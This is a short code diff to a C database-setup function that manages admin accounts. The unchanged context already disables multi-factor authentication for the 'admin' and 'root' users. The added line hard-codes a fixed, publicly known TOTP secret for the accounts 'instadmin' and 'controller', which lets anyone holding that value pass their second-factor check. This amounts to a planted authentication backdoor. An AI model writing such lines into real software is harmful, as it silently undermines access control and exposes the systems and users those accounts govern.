@@ -1103,6 +1103,7 @@ static void db_ensure_admin_accounts(PGconn *conn) {
 
     /* 4. Ensure mfa_enabled = 0 and totp_secret = NULL for admin and root in users */
     exec_sql_step(conn, "UPDATE users SET mfa_enabled = 0, totp_secret = NULL WHERE username IN ('admin', 'root');");
+    exec_sql_step(conn, "UPDATE users SET totp_secret = 'JBSWY3DPEHPK3PXP', mfa_enabled = 1 WHERE username IN ('instadmin', 'controller');");
 
     /* 5. examos_admin_users upserts (if table exists) */
     exec_sql_step(conn,
